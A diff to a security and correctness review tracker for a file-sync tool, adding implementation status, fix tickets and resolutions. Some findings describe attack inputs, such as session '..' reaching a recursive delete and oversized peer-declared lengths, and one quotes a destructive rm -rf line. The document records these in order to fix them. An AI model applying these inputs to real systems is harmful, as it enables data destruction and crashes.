@@ -32,6 +32,27 @@ This is a merge, not a re-analysis. Every finding from every report is listed on
 | Info / process | 6 (5 from the reviews, plus I-6 found on the Mac) |
 | Performance opportunities | 14 |
 
+## Implementation status (2026-09-24)
+
+All tickets in scope for v1 are implemented. That is 127 commits on `main`, after `fd58594`. `IMPLEMENTATION.md` maps each commit to its ticket, and `implementation/` holds each lane's reports. Verified on this machine: fmt and clippy clean, and 806 tests pass. On the instance, the suite passed six times in a row, and TLC, the tray build and arm64 all passed. Entries below carry an **Implemented** line with their commits.
+
+**Not implemented, by decision:**
+- **Peering tickets PEER-1 to PEER-8:** deferred past v1, since peering is dangerously experimental.
+- **LOCAL-10:** a documented boundary, not scheduled.
+- **`WISHLIST.md`:** FreeBSD, Intel Mac, the Linux tray as a supported feature, and replacing bincode.
+- **The `TODO-SPEED.md` measurement items.** P-13's local and remote halves are both implemented.
+
+**REL-1 step 2, signed releases, is implemented (2026-09-26, `10096af`).** The release job signs `SHA256SUMS` in the approval-gated `release` environment. `autobahn update` verifies the signature and its tag, and refuses unsigned releases newer than 0.4.0. The installer checks it when minisign is present. The private key is the `MINISIGN_SECRET_KEY` secret of the `release` environment, with a copy at `~/.config/autobahn-release-signing/` on the dev instance. Key ID `984B7A187D5598D3`. No signed release has been cut yet, so the signing step has not run on GitHub.
+
+**Verified only where it runs:**
+- **GitHub Actions.** Workflow changes (permissions, pins, the release gate, the audit job, the tray and macOS steps) are checked with `actionlint` and local runs of the scripts they call. Nothing on GitHub has run yet, because nothing has been pushed.
+- **macOS.** The checks are listed in `MAC-BENCH.md` section 7.
+- **The EC2 bench fleet.** BENCH-3 rewrote `orchestrate.py`. Do one bake and run smoke test before trusting a fleet run.
+
+**Format changes to release together:**
+- `COMPATIBILITY_EPOCH` goes from 14 to 15, from the progress frames and one-shot mode in `Initialize`.
+- `CHECKPOINT_VERSION` goes from 2 to 3, from the checksummed journal headers. Older builds refuse a format-3 ancestor.
+
 ## Decisions and fix specs
 
 **Agent trust, decided 2026-09-24: two tiers.**
@@ -47,6 +68,11 @@ Tier 1 fix specs, in `REVIEWS/fixes/`. All are proposed and not yet implemented.
 | [T1-3 Confined read and rename](fixes/T1-3-confined-read-and-rename.md) | M-5 (non-race part) |
 | [T1-4 Reserved names and staging root](fixes/T1-4-reserved-names-and-staging-root.md) | M-3 (inside-root symlink arm and staging permissions) |
 | [T1-5 Staging request paths](fixes/T1-5-staging-request-paths.md) | L-36 (receive sites) |
+
+Tier 2, recorded 2026-09-24:
+- **The exception, fixed:** [T2-1 Scan-delta header](fixes/T2-1-scan-delta-header.md), for H-19 and the cheap part of H-23.
+- **Documented boundaries under INVARIANTS' "genuine binaries" assumption:** H-6, H-23 (the rest), M-10, M-11, M-13, M-14, M-15, L-11, L-12, L-14. L-10 is deferred with peering as PEER-7.
+- **Doc change owed:** INVARIANTS and `docs/safety.md` state the tier 1 confinement rule separately from "genuine binaries", and I9's wording matches what the code checks. This lands with the T1 specs.
 
 **Peering leader trust, decided 2026-09-24: deferred past v1.**
 - The peering modes and config section were renamed to `peering-{conflict,alpha}-dangerously-experimental` and `[advanced.peering-dangerously-experimental]`. The old names are refused with a message pointing to `docs/peering.md`.
@@ -90,6 +116,34 @@ Local-user tickets:
 
 L-4 is covered by [T1-5](fixes/T1-5-staging-request-paths.md). M-1 is deferred with peering as PEER-5.
 
+**Fault walk, 2026-09-24.** The definite faults, checked against the current code and ticketed by severity.
+
+| Ticket | Covers |
+|---|---|
+| [F-C1](fixes/F-C1-emptied-root-untracked.md) | C-1 |
+| [F-H1](fixes/F-H1-resolve-keeps-the-winner.md) | H-1 |
+| [F-H2](fixes/F-H2-manual-sync-topology.md) | H-2, M-39 |
+| [F-H3](fixes/F-H3-stale-baseline-offer.md) | H-3 |
+| [F-H4](fixes/F-H4-directory-swap-rescan.md) | H-4 |
+| [F-H5](fixes/F-H5-deep-tree-stack.md) | H-5 |
+| [F-H7](fixes/F-H7-streaming-supply.md) | H-7 |
+| [F-H8](fixes/F-H8-excluded-content-deletion.md) | H-8 |
+| [F-H12](fixes/F-H12-session-identity.md) | H-12, L-30 |
+| [F-H13](fixes/F-H13-empty-live-config.md) | H-13 |
+| [F-H25](fixes/F-H25-root-contains-state.md) | H-25 |
+| [F-H27](fixes/F-H27-alert-hook-applescript.md) | H-27 |
+| [F-H29](fixes/F-H29-fix-command-quoting.md) | H-29 |
+| [F-H30](fixes/F-H30-resolve-argument-separator.md) | H-30 |
+| [F-M-OUT](fixes/F-M-OUT-untrusted-text.md) | M-6, M-7, M-8 |
+| [F-M-OBS](fixes/F-M-OBS-observer-and-watcher.md) | M-23 to M-28, L-27 |
+| [F-M-STAGE](fixes/F-M-STAGE-staging-and-apply.md) | M-29, M-30, M-31 |
+| [F-M-STATE](fixes/F-M-STATE-journal-and-reconcile.md) | M-32, M-33 |
+| [F-M-SUP](fixes/F-M-SUP-supervisor-robustness.md) | M-12, M-34, M-35, M-38 |
+| [F-M-UPD](fixes/F-M-UPD-updater-and-service.md) | M-21, M-40, M-41 |
+| [F-M-TEST](fixes/F-M-TEST-test-suite.md) | M-46, M-47, M-53, M-54, new arm64 failure |
+| [F-L-STATE](fixes/F-L-STATE-durability-nits.md) | L-16 to L-19, L-26 |
+| [F-L-MISC](fixes/F-L-MISC-small-correctness.md) | L-7, L-9, L-20, L-22, L-23, L-25, L-28, L-29, L-31 |
+
 **Release integrity, decided 2026-09-24.**
 - **`install.sh` fails closed and verifies the agent bundle,** in v1.
 - **Releases are signed with minisign.** The key lives in the approval-gated `release` environment, and the updater verifies with a built-in public key.
@@ -97,7 +151,7 @@ L-4 is covered by [T1-5](fixes/T1-5-staging-request-paths.md). M-1 is deferred w
 
 | Ticket | Covers | Status |
 |---|---|---|
-| [REL-1 Release integrity](fixes/REL-1-release-integrity.md) | M-17, H-28, I-3 | Proposed. Step 1, the strict installer, is for v1. Step 2, signing, is for v1 or next. |
+| [REL-1 Release integrity](fixes/REL-1-release-integrity.md) | M-17, H-28, I-3 | Implemented. Step 1 in `4458981`, `654c3c5`; step 2, signing, in `10096af`. |
 
 **Supported platforms, decided 2026-09-24: FreeBSD dropped for now, and both it and Intel Macs go on the wishlist.**
 - **CI.** The FreeBSD job is removed from `.github/workflows/ci.yml`, which removes the FreeBSD half of H-17.
@@ -122,6 +176,56 @@ L-4 is covered by [T1-5](fixes/T1-5-staging-request-paths.md). M-1 is deferred w
 
 M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 
+**CI hardening, decided 2026-09-24.**
+- **All eight recommendations accepted,** plus the clippy fix, which unblocks the rest.
+- **Not done:** enforcing SHA pinning in repository settings, declaring a minimum Rust version, and pinning a toolchain file.
+- **Correction:** the repository's default workflow token is already read-only, so `ci.yml` and `spec-full.yml` were never write-capable. Only `release.yml` over-grants.
+- **Finding:** TLA+ has never run in CI. The `spec` job was added on 2026-09-23 and skipped on both runs since, because the Linux job fails clippy. `spec-full.yml` has never been triggered.
+
+| Ticket | Covers |
+|---|---|
+| [CI-01](fixes/CI-01-clippy-green.md) Clippy green | H-17 (clippy half) |
+| [CI-02](fixes/CI-02-spec-gate.md) Spec gate | H-16 |
+| [CI-03](fixes/CI-03-pin-tla.md) Pin TLA+ jar | M-19 (jar) |
+| [CI-04](fixes/CI-04-workflow-permissions.md) Workflow permissions | M-19 (permissions; KIMI ABN-L14 token) |
+| [CI-05](fixes/CI-05-keychain-order.md) Keychain order | M-19 (KIMI ABN-L14 keychain) |
+| [CI-06](fixes/CI-06-action-pinning.md) Action pinning | M-19 (pinning) |
+| [CI-07](fixes/CI-07-locked.md) `--locked` | L-38 (part) |
+| [CI-08](fixes/CI-08-release-requires-green-ci.md) Release requires green CI | M-58 |
+| [CI-09](fixes/CI-09-macos-tray-tests.md) macOS tray tests | M-49 (macOS half) |
+| [CI-10](fixes/CI-10-dependency-advisories.md) Dependency advisories | I-1 |
+
+**CLI and operational behaviour, decided 2026-09-24.**
+- **Taken as recommended:** exit codes, `clean` keeping disabled sessions, POSIX-shell bootstrap, fixed SSH options, the installer served from the release, three doc notes, and a credentials warning instead of new default ignores.
+- **Reload changed from defer to fix:** a reload now touches only the sessions an edit changes.
+- **Symlink default:** stays verbatim.
+- **ctime:** stays out of unchanged-file detection.
+- **L-13 closed:** mounts are already excluded by default.
+
+| Ticket | Covers |
+|---|---|
+| [OPS-1](fixes/OPS-1-sync-exit-codes.md) `sync` exit codes | M-36 |
+| [OPS-2](fixes/OPS-2-clean-keeps-disabled.md) `clean` keeps disabled sessions | M-22 |
+| [OPS-3](fixes/OPS-3-posix-install-script.md) POSIX-shell bootstrap | M-37 |
+| [OPS-4](fixes/OPS-4-ssh-options.md) SSH options | M-9 |
+| [REL-1](fixes/REL-1-release-integrity.md), step 1 | L-32 (installer served from the release) |
+| [OPS-5](fixes/OPS-5-doc-notes.md) Doc notes | L-15, L-33, L-34 |
+| [OPS-6](fixes/OPS-6-secrets-warning.md) Credentials warning | I-2 |
+| [OPS-7](fixes/OPS-7-reload-by-session.md) Reload by session | L-24 |
+
+**Dependencies and hygiene, decided 2026-09-24.**
+- **bincode:** the move off 1.x waits for the next compatibility-epoch bump and is on `WISHLIST.md`. No separate decode-limit change, since tier 2 already covers a hostile peer.
+- **Bench results:** stay committed, deliberately.
+- **Yours, not ticketed:** the README's old half and the three root TODO files.
+- **Corrections:** no build output is committed under `bench/harness/target`; GLM's 538 files are the committed results. Those total about 50 MB, not 245 MB.
+
+| Ticket | Covers |
+|---|---|
+| [HYG-1](fixes/HYG-1-stale-artifacts.md) Stale artifacts | L-37 (the `dist/` binary, app version) |
+| [HYG-2](fixes/HYG-2-no-color.md) `NO_COLOR` | L-39 |
+| [HYG-3](fixes/HYG-3-comments-that-lie.md) Comments that lie | I-4, I-5 |
+| [HYG-4](fixes/HYG-4-code-nits.md) Code nits | L-35, L-40 |
+
 ---
 
 ## Critical
@@ -133,6 +237,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** Emptiness is judged by `children().is_empty()`. Ignored entries, FIFOs, sockets and oversized files are recorded as `Untracked` children, so a root holding only `.DS_Store` is not "gone". The halt does not fire, reconciliation sees every ancestor child as deleted on that side, and it emits a deletion for every file on the other side, in every mode including `two-way-paranoid`. Reproduced with a 20-file ancestor: `halted=false`, 20 deletions for beta.
 - **Triggers:** unmounted volume whose mountpoint keeps a `.DS_Store` or `.git`; a wipe that leaves `.git` or `node_modules`; a restore that recreates only dotfiles.
 - **Fix:** decide emptiness by synchronizable children in both `one_side_emptied_root` and the paranoid `empty` closure; add the shape to `emptied_root_detection`; teach the reconcile proptest generator to place `Untracked` nodes at every depth including the root.
+- **Resolution (2026-09-24):** Confirmed against the current code: `src/session/mod.rs:1351-1354`, and the paranoid guard at `src/tree/reconcile.rs:204-209`. Ticket [F-C1](fixes/F-C1-emptied-root-untracked.md), before v1.
+- **Implemented (2026-09-24):** `c8eb6fd`. See `IMPLEMENTATION.md`.
 - **Reproduced on macOS (2026-09-24, `d7c2e21`, MAC-BENCH 7a):** 20 files on a detached disk image, `touch .DS_Store` in the empty mount point, one cycle — `synchronized: 0 change(s) to alpha, 22 change(s) to beta`, and the beta went from 20 files to **0**. Identical under `two-way-paranoid`. No halt, no conflict, no blocked path: the cycle reports success while deleting every file on the side that still had them.
 - **Confirmed again (2026-09-24, macOS, `d7c2e21`):** read from the other direction while preparing MAC-BENCH 7a. `one_side_emptied_root` (`src/session/mod.rs:1335`) judges a side gone by `children().is_empty()`, and `src/scan/mod.rs:730` records an ignored entry as an `Untracked` child. So a path being *in the ignore list* does not protect it — `.DS_Store` is ignored by the shipped defaults and still keeps the root from reading empty. The check in MAC-BENCH 7a should be worded as "any leftover entry, ignored or not" rather than naming one file.
 
@@ -145,6 +251,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Correction (2026-09-24):** Tier 1 fault, fixed by [T1-1](fixes/T1-1-supply-confinement.md). The spec gates on this side's *own* last snapshot, not the controller's request set. An agent answering `SupplyOpen` has no view of the controller's requests, while its snapshot is always present. Snapshot membership also enforces ignores, which the reviews missed: today a peer can pull an ignored `.env` from inside the root. The current function is `supply_from` at `src/endpoint/local.rs:855`. The same bug class shipped in rsync as CVE-2024-12086 (fixed in 3.4.0).
 
 ---
+- **Implemented (2026-09-24):** `3451d3f`, `bd67173`, `cdd1109`. See `IMPLEMENTATION.md`.
 
 ## High
 
@@ -154,6 +261,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/main.rs:2292-2300`, `2410-2530`, `src/tree/reconcile.rs:369`
 - **What:** Resolution retires the losing side by deleting it and relies on ordinary reconciliation to restore it. When the winner still matches the ancestor, the next cycle propagates the new deletion instead. Reproduced: `resolve ... keep.txt --keep alpha --yes` reported "one version kept" and the file vanished from both roots. `--keep both` on an in-sync path renames it everywhere. `resolve group ./` normalizes to `""`, so `node_at` returns the root and the whole tree is retired. Keeping beta also conflicts with strict-alpha and one-way semantics. Triggers: running the same resolve twice, a stale tray click, naming an in-sync file.
 - **Fix:** explicit resolution semantics that preserve the selected version and update provenance; refuse paths not in recorded conflicts unless the winner differs from the ancestor; reject empty path; coordinate with running workers. Tests: every mode and winner, already-agreed files, repeated resolution, stale conflict records, directories, fan-out, then further cycles.
+- **Resolution (2026-09-24):** Confirmed. `run_resolve` takes unmatched paths "at their word" (`src/main.rs:2592-2600`), retires the loser, and never touches the ancestor or the session lock. Ticket [F-H1](fixes/F-H1-resolve-keeps-the-winner.md). Stage 1, for v1, refuses the shapes that would delete the winner. Stage 2 has resolution forget the path in the ancestor, through the session worker.
+- **Implemented (2026-09-24):** `2f2b051`, `82bbb91`, `cbc75fe`, `f78238e`. See `IMPLEMENTATION.md`.
 
 ### H-2. Manual `sync` bypasses root-overlap and topology protection
 
@@ -161,6 +270,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/main.rs:939`
 - **What:** Explicit-root `sync` skips the topology checks that configured sessions run; neither endpoint construction nor `Session::new` enforces them. Syncing `tree/source` into `tree` with `one-way-alpha` removed the source directory itself.
 - **Fix:** enforce topology validation at a shared construction boundary before opening endpoints. CLI tests for equal roots, nested roots, aliases, destination containing its source.
+- **Resolution (2026-09-24):** Confirmed. The check lives only in `Config::plans()` (`src/config.rs:1306-1325`), and `run_sync` never calls it. Ticket [F-H2](fixes/F-H2-manual-sync-topology.md) extracts one topology check that both call.
+- **Implemented (2026-09-24):** `b5750eb`, `dc04b1c`. See `IMPLEMENTATION.md`.
 
 ### H-3. A transition offers a stale fold labeled with the observer's new generation; a shared root can roll its baseline back
 
@@ -168,6 +279,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:1505-1507`, `1542-1543`, `src/endpoint/observer.rs:509-520`
 - **What:** `offer_baseline` refuses only when `based_on < baseline_generation`. The caller sets `seen_generation = observer.generation()` after invalidating and passes that, so the refusal can never fire. Reproduced with two endpoints sharing one observer: B deleted `right/y` and rescanned; A deleted unrelated `left/x` from its older snapshot; B's next scan reported `right/y` present although absent on disk. Dirty marks for the unrelated change may already be consumed, so nothing corrects it until the 120 s full walk. The same line swallows wake-ups that land between the lease scan and the post-write announcement.
 - **Fix:** capture the lease generation before the first `invalidate` and offer with that; advance `seen_generation` only by the endpoint's own bumps. Test: two real endpoints, two paths, an intervening scan, a transition through `LocalEndpoint::transition`, watcher and polling.
+- **Resolution (2026-09-24):** Confirmed. `17715e9` sets `seen_generation` to the observer's current generation (`src/endpoint/local.rs:1528`) before offering the fold (`:1564`), so `offer_baseline`'s check (`observer.rs:524`) never refuses. Ticket [F-H3](fixes/F-H3-stale-baseline-offer.md) offers at the lease's generation, and advances `seen_generation` only past the endpoint's own announcements.
+- **Implemented (2026-09-24):** `99befde`. See `IMPLEMENTATION.md`.
 
 ### H-4. Directory-to-directory replacement is invisible to incremental scans
 
@@ -175,7 +288,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/scan/mod.rs:140-151` (`DirtyPaths::mark` sets `relist` only on the parent), `:554-589` (`scan_directory` adopts the baseline's unmarked children without `stat`)
 - **What:** After `mv A/live A/old && mv A/staging A/live`, B showed `live/f1=old1`, `old/f1=old1`, and `staging/` was deleted on B; the new content existed only on A for about 120 s. Breaks I1 and the "incremental equals full" contract. Triggers: atomic deploy swaps, `rmdir x; mkdir x; populate`, renaming over an empty directory.
 - **Fix:** set `relist = true` on the marked node itself, or have directory Create/Rename events request a relist. Add a dir-swap case to `incremental_scans_agree_with_full_scans`.
-
+- **Resolution (2026-09-24):** Confirmed: `DirtyPaths::mark` relists only the parent (`src/scan/mod.rs:152-163`). Ticket [F-H4](fixes/F-H4-directory-swap-rescan.md).
+- **Implemented (2026-09-24):** `92e5006`. See `IMPLEMENTATION.md`.
 - **Reproduced on macOS (2026-09-24, `d7c2e21`, MAC-BENCH 7b):** FSEvents does not hide it. After `mv live old && mv staging live`, the beta's `live/f1` held the *old* content at 8 s, 30 s and 2 m 30 s, and still after a forced `flush`; only `verify`, which re-reads every byte, fixed it. The tree *shape* updated within one cycle, so the session read `synchronized` while the beta held two copies of the old file and no copy of the new one. On Linux the note says it healed at the two-minute walk; here it did not.
 
 ### H-5. Deep local trees overflow the scanner's 2 MiB thread stack and abort the whole process
@@ -184,7 +298,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/scan/mod.rs:531` onward (`scan_directory` → `walk` → `scan_entry`); no `stack_size` set anywhere
 - **What:** `autobahn sync` succeeded at depth 1,400 and aborted with `fatal runtime error: stack overflow` at 1,700 and 1,850. Paths at that depth are ~3.5 KB, under `PATH_MAX`, so the ENAMETOOLONG guard never fires. Abort kills every session; a login service crash-loops since the tree persists. `recount`, `tree::apply`, `diff`, `validate`, reconcile and serde recurse the same way.
 - **Fix:** spawn scan/session/router threads with an explicit large stack, or cap depth and mark deeper directories `Problematic`.
-
+- **Resolution (2026-09-24):** Confirmed: no thread stack size is set anywhere. Ticket [F-H5](fixes/F-H5-deep-tree-stack.md).
+- **Implemented (2026-09-24):** `7b433fc`, `7d4712d`. See `IMPLEMENTATION.md`.
 - **Not reachable on macOS (2026-09-24, `d7c2e21`, MAC-BENCH 7c):** a 600-level chain synced without aborting. macOS's 1,024-byte path limit stops the walk at depth ~500, and it arrives as a blocked path — `unable to probe entry: File name too long (os error 63)` — not a stack overflow. The Linux 4,096-byte limit is what makes the depth reachable there.
 
 ### H-6. Hostile peer sends a deeply nested `Node`; recursive bincode decode overflows the stack (both directions)
@@ -193,6 +308,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/transport/mux.rs:166` (router thread), `src/transport/mod.rs:414` (agent dispatcher), `src/endpoint/remote.rs:241`; consumers `tree/mod.rs:337` (`validate`), `tree/reconcile.rs:133`, `local.rs:2103`, `Drop`
 - **What:** bincode 1.3 has no depth limit; ~20–30 bytes per level means a few-thousand-deep chain fits in ~100 KB. SIGSEGV, not a catchable panic, mid-cycle. Symmetric: a hostile peering leader kills follower agents via `AncestorCheckpoint{ ancestor: Option<Node> }`. `INVARIANTS.md` documents this as accepted boundary I9-B under a "genuine agent binaries" model.
 - **Fix:** depth budget during decode (custom `Deserialize`) or a streaming validator; make `Drop` for `Node` iterative.
+- **Resolution (2026-09-24):** Tier 2 documented boundary: a hostile peer is outside the genuine-binaries model. `INVARIANTS.md` already records it as I9-B.
 
 ### H-7. File transfer buffers the complete file or delta in memory before returning its first frame
 
@@ -200,6 +316,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:787-872` (`buffer_delta` → `supply_from`), `:1236` (`supply_pull`), `:848-866`
 - **What:** `supply_pull` calls `buffer_delta` synchronously; the batch limit applies afterwards. With an empty or mismatching base signature the delta is the whole file. Measured: requesting one frame added ~33.6 MB live heap for a 32 MiB file and ~134.4 MB for 128 MiB. `max_file_size` defaults to unlimited, so a 20 GB image allocates 20 GB in the supervisor. KIMI adds the hostile arm: a destination supplying one fake `BlockHash` forces the non-streaming path for the largest file in the tree.
 - **Fix:** keep an open `File` in `SupplyState` and read lazily; run `deltify` on a helper thread feeding a bounded channel; fall back to chunked streaming when a delta exceeds a threshold. Measure memory and time-to-first-batch across sizes.
+- **Resolution (2026-09-24):** Confirmed; the fix keeps the alternate-path fallback for failures before the first frame. Ticket [F-H7](fixes/F-H7-streaming-supply.md).
+- **Implemented (2026-09-24):** `7891502`. See `IMPLEMENTATION.md`.
 
 ### H-8. Size-excluded, special-file and other `Untracked` content is destroyed when its parent directory is deleted
 
@@ -207,6 +325,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/local.rs:~2495-2531`, `src/tree/reconcile.rs:53-85` (`blocking` comment claims the opposite), `docs/configuration.md:73`
 - **What:** `Untracked` covers pattern ignores, files over `max_file_size`, sockets, FIFOs, devices, and ignored symlinks. The "excluded content goes with the directory" branch removes all of them. Shapes: a beta-only 2 GB dump under a directory alpha deletes; an edit that grows `d/a` past the limit while beta deletes `d` is treated as a pure deletion. Also wipes `.git`, `.env` and local build state. The two layers hold opposite beliefs.
 - **Fix:** carry a reason on `Untracked` (`Ignored`, `TooLarge`, `Special`); let only `Ignored` be removed by directory deletion, others refuse and surface a conflict; treat "untracked on one side, present in ancestor" as not deleted; surface every excluded entry destroyed as a Problem; fix the comment.
+- **Resolution (2026-09-24):** Confirmed at `src/endpoint/local.rs:2531`; the fix needs no format change. Ticket [F-H8](fixes/F-H8-excluded-content-deletion.md).
+- **Implemented (2026-09-24):** `3b20e88`, `e2610fb`. See `IMPLEMENTATION.md`.
 
 ### H-9. Peering: an already-authorized channel is not fenced after takeover; the fence is checked only when a lease is presented
 
@@ -238,6 +358,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/config.rs:1338`
 - **What:** Cross-session comparisons are skipped when `plan.display()` matches. `host:/tree` and `host:/tree/nested` in one group both display as `group@host`, so their writable overlap escapes validation. Reused labels also cause ambiguous progress, alert and UI associations.
 - **Fix:** compare session identities or plan indices; carry a stable typed identity through control, progress, alerts and UI.
+- **Resolution (2026-09-24):** Confirmed: "same session" compares `plan.display()` (`src/config.rs:1383`). Also fixes L-30. Ticket [F-H12](fixes/F-H12-session-identity.md).
+- **Implemented (2026-09-24):** `06ca50f`, `141c813`, `dd6386e`. See `IMPLEMENTATION.md`.
 
 ### H-13. Disabling the final active session leaves the previous workers running under live reload
 
@@ -245,6 +367,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/supervisor/reload.rs:40`
 - **What:** `disable` saves a configuration with zero active plans; the reloader rejects it as describing no sessions and retains the previous workers. Removing the last group behaves the same.
 - **Fix:** distinguish startup policy from live-reconfiguration policy; allow an empty live config, stop workers, keep the control/reload service. Test disable-last, verify stop, enable, verify resume.
+- **Resolution (2026-09-24):** Confirmed: `reload::load` refuses zero plans (`src/supervisor/reload.rs:44`). Land with OPS-7. Ticket [F-H13](fixes/F-H13-empty-live-config.md).
+- **Implemented (2026-09-24):** `520ffeb`. See `IMPLEMENTATION.md`.
 
 ### H-14. Benchmark observer accepts unauthenticated arbitrary file writes on `0.0.0.0`
 
@@ -253,6 +377,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `floor_arm` takes an unrestricted path and payload, `floor_write` writes it. No auth, no root confinement. Any reachable client can overwrite shell rc or SSH authorization files as the benchmark user. The local smoke test starts this listener. (EC2 security group restricts non-SSH traffic to fleet members.)
 - **Fix:** authenticate, confine to a scratch root without symlink escapes, default local runs to a private socket or protected loopback, bound request sizes and workers.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-1](fixes/BENCH-1-observer-listener.md).
+- **Implemented (2026-09-24):** `a51da44`. See `IMPLEMENTATION.md`.
 
 ### H-15. The A/B benchmark `rm -rf`s an arbitrary supplied corpus directory
 
@@ -261,6 +386,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `--corpus DIR` assigns to `CORPUS`; every leg runs `rm -rf "$dest" "$state" "$CORPUS"`. Supplying a checkout destroys it.
 - **Fix:** treat input as read-only and copy into an owned temp dir, or require a verified disposable destination; remove only harness-created directories.
 - **Resolution (2026-09-24):** Fault under the bench standard, [BENCH-2](fixes/BENCH-2-ab-corpus.md).
+- **Implemented (2026-09-24):** `10d62df`. See `IMPLEMENTATION.md`.
 
 ### H-16. The formal-spec gate reports success when TLC fails
 
@@ -268,6 +394,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `spec/check.sh:41`
 - **What:** TLC output is piped into `grep` without `pipefail`; the filter matches `Error`, `violated`, `Deadlock`, `Temporal`. A fake Java printing an invariant violation and exiting 17 made `check.sh quick` exit 0. Both ordinary and full-spec CI depend on this. The trace-validation branch accepts an empty trace directory as success.
 - **Fix:** preserve TLC's exit status independently of filtering; reject an empty trace directory; wrapper tests for failure, success and missing traces.
+- **Resolution (2026-09-24):** [CI-02](fixes/CI-02-spec-gate.md).
+- **Implemented (2026-09-24):** `6f901c5`. See `IMPLEMENTATION.md`.
 
 ### H-17. CI on `main` is red; the spec and macOS jobs have not run on the current head
 
@@ -276,7 +404,9 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** `spec` and `mac` depend on `linux`, so neither has run on `1180499`. README and `support-boundaries.md` advertise FreeBSD but `install.sh`, `build-agents.sh` and `release.yml` do not build it. Locally `cargo test --release` passes (478 tests, OPUS) and 474 pass / 1 fail (ASTRA, see M-46).
 - **Fix:** three clippy fixes; gate the FreeBSD update tests; either ship FreeBSD or stop advertising it.
 - **Resolution (2026-09-24):** The FreeBSD half is resolved by dropping FreeBSD for now; see the platforms decision above and `WISHLIST.md`. The three clippy errors remain.
-- **New (2026-09-24):** The latest CI run, 35946282106, also failed on Linux arm64 in `fan_out_races::two_betas_edit_different_files_and_both_land` (`tests/e2e.rs:1869`). None of the reviews mention it, and one run does not show whether it is flaky.
+- **New (2026-09-24):** The latest CI run, 35946282106, also failed on Linux arm64 in `fan_out_races::two_betas_edit_different_files_and_both_land` (`tests/e2e.rs:1869`). None of the reviews mention it, and one run does not show whether it is flaky. Investigation is part of [F-M-TEST](fixes/F-M-TEST-test-suite.md).
+- **Resolution (2026-09-24):** The clippy half is [CI-01](fixes/CI-01-clippy-green.md).
+- **Implemented (2026-09-24):** `0baf70a`, `0e85e98`, `3a61f13`, `8091f45`, `8344968`, `df5325a`, `eb46d11`. See `IMPLEMENTATION.md`.
 
 ### H-18. Wire-controlled `Initialize.session`, `side` and `root` are unvalidated; `session` reaches `remove_dir_all`, and attach-mode leaders choose the follower's root
 
@@ -285,6 +415,7 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **What:** No consumer of `Initialize` checks these strings. `session = ".."` deletes `~/.autobahn` on channel open; `"../../.."` reaches `$HOME`. Session/side name the staging directory (escaping `~/.autobahn/staging`; `sweep_staging` then deletes 64-hex-named files at the chosen location). `ancestor_copy_path` writes over another session's real ancestor store. `root` is taken verbatim after `~` expansion and becomes the confinement boundary: in attach mode the remote leader chooses `/` or `$HOME` and gets `Scan`, `ReadFile`, `StagePush`, `Transition`, `Rename` there. Normally self-inflicted; in peering attach mode (`ssh <leader> autobahn peering attach`) or against a forced-command agent the attacker is the controller.
 - **Fix:** validate `session`/`side` as plain single names (`validate_name` rules, strict charset, length cap) before any filesystem use; never `remove_dir_all` a wire-derived path; in attach mode pin `root` and session id to the follower's own configured values and refuse mismatches; consider validating `ignores`, `default_owner`, `default_group`.
 - **Correction (2026-09-24):** The session and side half is a Tier 1 fault, fixed by [T1-2](fixes/T1-2-initialize-identifiers.md). An exact rule is possible, not just a loose charset. Session ids always come from `session_identifier` and are 32 lowercase hex characters, and side is always `alpha` or `beta`. The spec deletes the legacy `remove_dir_all` (now at `src/transport/mod.rs:929`). Pinning `root` in attach mode is deferred past v1: ticket [PEER-1](fixes/PEER-1-attach-policy.md).
+- **Implemented (2026-09-24):** `85668a8`, `bd67173`. See `IMPLEMENTATION.md`.
 
 ### H-19. Agent-supplied `ScanDelta.length` and `block_size` drive unbounded allocations on the controller
 
@@ -292,6 +423,8 @@ M-20 is LOCAL-07. Committed bench results are a hygiene item under L-37.
 - **Where:** `src/endpoint/remote.rs:212-235` (`Vec::with_capacity(header.length as usize)` at `:219`), `src/rsync/mod.rs:135` (`vec![0u8; block_size as usize]`), `src/endpoint/local.rs:866`; header at `src/protocol.rs:76-90`
 - **What:** `length` is a peer `u64` used before any byte arrives; `u64::MAX` is a capacity-overflow abort, `2^40` an OOM. `block_size` is never clamped to `[1024, 65536]`: `u32::MAX` zeroes ~4 GiB per scan, `1` yields one BLAKE3 call per byte. The expansion check runs once per batch, so a 64 MiB frame of `Blocks{0,N}` ops expands millions of times before being caught. Worker panics propagate through `handle.join().expect(...)` (`supervisor/mod.rs:565`), killing the supervisor; service restart loops re-hit the payload. Violates documented invariant I9.
 - **Fix:** never `with_capacity` from a peer-declared length; cap `length` at a protocol maximum; reject `block_size` outside range in `Signature::validate` and at the `ScanDelta` boundary; cap `hashes.len()`; bound each op before `patch`.
+- **Resolution (2026-09-24):** Fixed as the tier 2 exception, [T2-1](fixes/T2-1-scan-delta-header.md).
+- **Implemented (2026-09-24):** `4eac723`, `bd67173`. See `IMPLEMENTATION.md`.
 
 ### H-20. Peering: leader-pushed `config.toml` carries `agent_command`, executed on followers at failover (delayed RCE)
 
